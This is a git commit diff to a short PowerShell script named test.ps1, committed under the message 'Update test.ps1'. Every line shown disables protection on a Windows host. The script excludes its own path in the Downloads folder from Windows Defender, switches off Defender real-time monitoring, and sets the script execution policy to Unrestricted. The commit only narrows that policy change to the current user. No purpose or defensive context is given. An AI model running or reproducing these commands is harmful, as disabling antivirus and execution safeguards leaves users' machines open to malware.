6a54b06404cdb7160f18471f0a8be777bde4ba16
AidanAma <93228705+AidanAma@users.noreply.github.com>
2024-02-13 10:33:53 -0500

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,3 +1,3 @@
 Set-MpPreference -ExclusionPath ($HOME +'/Downloads/test.ps1')
 Set-MpPreference -DisableRealtimeMonitoring $true
-Set-ExecutionPolicy Unrestricted
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser
